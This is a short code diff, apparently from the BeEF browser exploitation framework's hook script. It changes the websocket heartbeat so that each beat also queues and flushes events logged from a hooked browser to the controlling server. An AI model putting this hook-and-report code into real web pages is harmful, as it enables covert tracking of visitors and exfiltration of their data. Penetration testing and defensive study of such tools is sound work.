@@ -84,6 +84,14 @@ beef.websocket = {
      * todo: there is probably a more efficient way to do this. Double-check WebSocket API.
      */
     alive: function (){
+        try {
+            if (beef.logger.running) {
+                beef.logger.queue();
+            }
+        } catch(err){}
+
+        beef.net.flush();
+
         beef.websocket.send('{"alive":"'+beef.session.get_hook_session_id()+'"}');
         setTimeout("beef.websocket.alive()", parseInt(beef.websocket.ws_poll_timeout));
     }
